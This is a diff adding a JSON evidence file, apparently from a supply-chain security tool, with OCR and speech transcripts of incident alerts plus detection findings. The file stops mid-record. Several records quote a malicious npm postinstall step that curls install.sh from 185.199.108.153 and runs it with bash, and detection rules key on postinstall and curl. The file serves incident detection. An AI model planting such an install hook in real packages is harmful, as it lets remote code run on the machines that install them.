@@ -1,0 +1,2983 @@
+{
+  "schema_version": "supplyguard.multimodal-evidence.v1",
+  "updated_at": "2026-06-03T08:01:40.007793+00:00",
+  "storage_dir": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal",
+  "evidence": [
+    {
+      "evidence_id": "MME-20260603080139438792-D40CCA7A",
+      "filename": "MME-20260603080139438792-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603080139438792-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260603080139438792-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "source_type": "image",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T08:01:39.458816+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603080139438792-D40CCA7A-image-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T08:01:39.442793+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-217C8CCA9ADB3D5A",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603080139438792-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T08:01:39.456807+00:00",
+          "fingerprint": "multimodal-finding:217c8cca9adb3d5a"
+        },
+        {
+          "id": "MMF-9C7A6484BB62F7F4",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603080139438792-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T08:01:39.456807+00:00",
+          "fingerprint": "multimodal-finding:9c7a6484bb62f7f4"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603080102092971-B4A4919E",
+      "filename": "MME-20260603080102092971-B4A4919E-image-incident-alert.png",
+      "original_filename": "incident-alert.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603080102092971-B4A4919E-image-incident-alert.png",
+      "relative_path": "storage/multimodal/MME-20260603080102092971-B4A4919E-image-incident-alert.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 76773,
+      "sha256": "b4a4919ef02402228e8f13a046161e93d2cd157f7fe19840aad062f95e17ef72",
+      "uploaded_at": "2026-06-03T08:01:02.092971+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1500,
+        "height": 900,
+        "opencv": {
+          "width": 1500,
+          "height": 900,
+          "channels": 3,
+          "preprocess_ready": true
+        },
+        "channels": 3,
+        "preprocess_ready": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "SupplyGuard Incident Screenshot\n高风险告警\n时间\n凌晨三点\n服务\ncheckout-api\n事件\n出现异常外联\n目标\n185.199.108.153/install.sh\n接口\nadmin/export\n访问量升高\n建议\n隔离构建产物并复核provenance",
+          "confidence": 0.994,
+          "evidence_type": "visual_ocr",
+          "engine": "PaddleOCR/PP-OCRv5",
+          "source_path": "storage/multimodal/MME-20260603080102092971-B4A4919E-image-incident-alert.png",
+          "language": "ch",
+          "created_at": "2026-06-03T08:01:10.341375+00:00",
+          "segments": [
+            {
+              "text": "SupplyGuard Incident Screenshot",
+              "confidence": 0.972
+            },
+            {
+              "text": "高风险告警",
+              "confidence": 1.0
+            },
+            {
+              "text": "时间",
+              "confidence": 1.0
+            },
+            {
+              "text": "凌晨三点",
+              "confidence": 0.998
+            },
+            {
+              "text": "服务",
+              "confidence": 1.0
+            },
+            {
+              "text": "checkout-api",
+              "confidence": 0.988
+            },
+            {
+              "text": "事件",
+              "confidence": 1.0
+            },
+            {
+              "text": "出现异常外联",
+              "confidence": 0.998
+            },
+            {
+              "text": "目标",
+              "confidence": 1.0
+            },
+            {
+              "text": "185.199.108.153/install.sh",
+              "confidence": 0.959
+            },
+            {
+              "text": "接口",
+              "confidence": 0.999
+            },
+            {
+              "text": "admin/export",
+              "confidence": 1.0
+            },
+            {
+              "text": "访问量升高",
+              "confidence": 0.999
+            },
+            {
+              "text": "建议",
+              "confidence": 1.0
+            },
+            {
+              "text": "隔离构建产物并复核provenance",
+              "confidence": 0.998
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 41,
+          "end": 45,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/in"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 49,
+          "end": 61,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "upplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admi"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 67,
+          "end": 71,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "t Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 69,
+          "end": 71,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 75,
+          "end": 90,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "shot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核pr"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 105,
+          "end": 117,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 105,
+          "end": 117,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-5919820287FCB6C4",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603080102092971-B4A4919E",
+          "source_type": "image",
+          "source_name": "incident-alert.png",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 105,
+              "end": 117,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance"
+            }
+          ],
+          "evidence": "SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance",
+          "confidence": 0.856,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T08:01:10.360377+00:00",
+          "fingerprint": "multimodal-finding:5919820287fcb6c4"
+        }
+      ],
+      "risk_score": 84,
+      "risk_level": "high"
+    },
+    {
+      "evidence_id": "MME-20260603080052880859-DDC20BBF",
+      "filename": "MME-20260603080052880859-DDC20BBF-image-cicd-error.png",
+      "original_filename": "cicd-error.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603080052880859-DDC20BBF-image-cicd-error.png",
+      "relative_path": "storage/multimodal/MME-20260603080052880859-DDC20BBF-image-cicd-error.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 86781,
+      "sha256": "ddc20bbf75475502c7210cb486ea2c86391daf10f72a0108c1837b9a467debfe",
+      "uploaded_at": "2026-06-03T08:00:52.880859+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1600,
+        "height": 950,
+        "opencv": {
+          "width": 1600,
+          "height": 950,
+          "channels": 3,
+          "preprocess_ready": true
+        },
+        "channels": 3,
+        "preprocess_ready": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "GitHub Actions / deploy-prod-2481\n[09:42:10]\nRun npm ci\nnpm\ninstall\n@acme/payments-helper@9.9.2\nresolved\n@acme/payments-helper\nr from public registry\n@acme/payments-helper@9.9.2 p\npostinstall\npostinstall\ncurl\n185.199.108.\n.153/install.sh\nbash\nwarning:\nunexpected\nexternal\ndownload\nduring\nbuild\nartifact\ndigest\nmismatch:\nsha256:87e3dd15\ndeploy\nblocked:\nprovenance\nrequires\nmanual\nreview\nExpected\nOCR:\nnpm\ninstall\n+ postinstall\nlcurl\n185.199.108.153/install.sh",
+          "confidence": 0.994,
+          "evidence_type": "visual_ocr",
+          "engine": "PaddleOCR/PP-OCRv5",
+          "source_path": "storage/multimodal/MME-20260603080052880859-DDC20BBF-image-cicd-error.png",
+          "language": "ch",
+          "created_at": "2026-06-03T08:01:02.070971+00:00",
+          "segments": [
+            {
+              "text": "GitHub Actions / deploy-prod-2481",
+              "confidence": 0.981
+            },
+            {
+              "text": "[09:42:10]",
+              "confidence": 0.992
+            },
+            {
+              "text": "Run npm ci",
+              "confidence": 0.996
+            },
+            {
+              "text": "npm",
+              "confidence": 0.976
+            },
+            {
+              "text": "install",
+              "confidence": 1.0
+            },
+            {
+              "text": "@acme/payments-helper@9.9.2",
+              "confidence": 1.0
+            },
+            {
+              "text": "resolved",
+              "confidence": 1.0
+            },
+            {
+              "text": "@acme/payments-helper",
+              "confidence": 0.998
+            },
+            {
+              "text": "r from public registry",
+              "confidence": 0.973
+            },
+            {
+              "text": "@acme/payments-helper@9.9.2 p",
+              "confidence": 0.99
+            },
+            {
+              "text": "postinstall",
+              "confidence": 1.0
+            },
+            {
+              "text": "postinstall",
+              "confidence": 1.0
+            },
+            {
+              "text": "curl",
+              "confidence": 0.996
+            },
+            {
+              "text": "185.199.108.",
+              "confidence": 0.999
+            },
+            {
+              "text": ".153/install.sh",
+              "confidence": 0.999
+            },
+            {
+              "text": "bash",
+              "confidence": 0.999
+            },
+            {
+              "text": "warning:",
+              "confidence": 0.999
+            },
+            {
+              "text": "unexpected",
+              "confidence": 0.999
+            },
+            {
+              "text": "external",
+              "confidence": 0.999
+            },
+            {
+              "text": "download",
+              "confidence": 1.0
+            },
+            {
+              "text": "during",
+              "confidence": 0.999
+            },
+            {
+              "text": "build",
+              "confidence": 1.0
+            },
+            {
+              "text": "artifact",
+              "confidence": 1.0
+            },
+            {
+              "text": "digest",
+              "confidence": 1.0
+            },
+            {
+              "text": "mismatch:",
+              "confidence": 0.997
+            },
+            {
+              "text": "sha256:87e3dd15",
+              "confidence": 1.0
+            },
+            {
+              "text": "deploy",
+              "confidence": 1.0
+            },
+            {
+              "text": "blocked:",
+              "confidence": 0.999
+            },
+            {
+              "text": "provenance",
+              "confidence": 0.999
+            },
+            {
+              "text": "requires",
+              "confidence": 1.0
+            },
+            {
+              "text": "manual",
+              "confidence": 0.999
+            },
+            {
+              "text": "review",
+              "confidence": 1.0
+            },
+            {
+              "text": "Expected",
+              "confidence": 1.0
+            },
+            {
+              "text": "OCR:",
+              "confidence": 0.993
+            },
+            {
+              "text": "npm",
+              "confidence": 0.998
+            },
+            {
+              "text": "install",
+              "confidence": 0.999
+            },
+            {
+              "text": "+ postinstall",
+              "confidence": 0.999
+            },
+            {
+              "text": "lcurl",
+              "confidence": 0.918
+            },
+            {
+              "text": "185.199.108.153/install.sh",
+              "confidence": 0.983
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "time",
+          "value": "09:42:10",
+          "normalized": "09:42:10",
+          "start": 35,
+          "end": 43,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9"
+        },
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 68,
+          "end": 95,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "loy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public re"
+        },
+        {
+          "type": "package",
+          "value": "@acme/payments-helper",
+          "normalized": "@acme/payments-helper",
+          "start": 105,
+          "end": 126,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9."
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 180,
+          "end": 191,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "m public registry @acme/payments-helper@9.9.2 p postinstall postinstall curl 185.199.108. .153/install.sh b"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 204,
+          "end": 208,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "payments-helper@9.9.2 p postinstall postinstall curl 185.199.108. .153/install.sh bash warning: unex"
+        },
+        {
+          "type": "action",
+          "value": "bash",
+          "normalized": "bash",
+          "start": 238,
+          "end": 242,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "l postinstall curl 185.199.108. .153/install.sh bash warning: unexpected external download during bu"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 432,
+          "end": 447,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "w Expected OCR: npm install + postinstall lcurl 185.199.108.153/install.sh"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-32243C956BC937F1",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603080052880859-DDC20BBF",
+          "source_type": "image",
+          "source_name": "cicd-error.png",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 432,
+              "end": 447,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "w Expected OCR: npm install + postinstall lcurl 185.199.108.153/install.sh"
+            }
+          ],
+          "evidence": "GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.9.2 p postinstall postinstall curl 185.199.108. .153/install.sh bash warning: unexpected external download during build artifact digest mismatch: sha256:87e3dd15 deploy blocked: prove...",
+          "confidence": 0.918,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T08:01:02.089971+00:00",
+          "fingerprint": "multimodal-finding:32243c956bc937f1"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603080050377411-4A1F3B72",
+      "filename": "MME-20260603080050377411-4A1F3B72-audio-alert.wav",
+      "original_filename": "alert.wav",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603080050377411-4A1F3B72-audio-alert.wav",
+      "relative_path": "storage/multimodal/MME-20260603080050377411-4A1F3B72-audio-alert.wav",
+      "source_type": "audio",
+      "mime_type": "audio/wav",
+      "size_bytes": 623256,
+      "sha256": "4a1f3b72e64de61bd001119181c242b412b1f53ad769dd2d64251853f6bf557c",
+      "uploaded_at": "2026-06-03T08:00:50.377411+00:00",
+      "metadata": {
+        "extension": ".wav",
+        "content_type": "audio/wav"
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "audio",
+          "recognized_text": "凌晨3. 赤烤雷批爱出现一场外连 atmean export 接口访问两声高 请隔离购劲产务 并负合 provenance",
+          "confidence": 0.818,
+          "evidence_type": "audio_asr",
+          "engine": "faster-whisper/faster-whisper-tiny",
+          "source_path": "storage/multimodal/MME-20260603080050377411-4A1F3B72-audio-alert.wav",
+          "language": "zh",
+          "created_at": "2026-06-03T08:00:52.855859+00:00",
+          "segments": [
+            {
+              "start": 0.0,
+              "end": 5.0,
+              "text": "凌晨3. 赤烤雷批爱出现一场外连",
+              "confidence": 0.818
+            },
+            {
+              "start": 5.0,
+              "end": 9.0,
+              "text": "atmean export 接口访问两声高",
+              "confidence": 0.818
+            },
+            {
+              "start": 9.0,
+              "end": 14.0,
+              "text": "请隔离购劲产务 并负合 provenance",
+              "confidence": 0.818
+            }
+          ]
+        }
+      ],
+      "entities": [],
+      "findings": [],
+      "risk_score": 0,
+      "risk_level": "low"
+    },
+    {
+      "evidence_id": "MME-20260603075748475445-D40CCA7A",
+      "filename": "MME-20260603075748475445-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075748475445-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260603075748475445-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "source_type": "image",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:57:48.496447+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075748475445-D40CCA7A-image-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:57:48.479447+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-3DEFA11019F67584",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075748475445-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
